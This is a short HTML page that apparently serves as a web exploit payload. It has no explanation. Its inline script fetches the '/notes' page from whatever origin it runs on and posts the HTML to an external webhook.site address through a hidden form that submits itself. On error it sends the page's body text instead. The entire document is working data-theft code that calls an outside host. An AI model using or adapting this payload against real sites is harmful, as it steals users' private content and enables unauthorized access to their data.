<!DOCTYPE html>
<html>
  <body>
    <form id="steal" method="POST" action="https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6">
      <input type="hidden" name="note" id="note">
    </form>
    <script>
      fetch('/notes')
        .then(response => response.text())
        .then(html => {
          document.getElementById('note').value = html;
          document.getElementById('steal').submit();
        })
        .catch(e => {
          document.getElementById('note').value = 'ERROR: ' + e + '\n' + document.body.innerText;
          document.getElementById('steal').submit();
        });
    </script>
  </body>
</html>
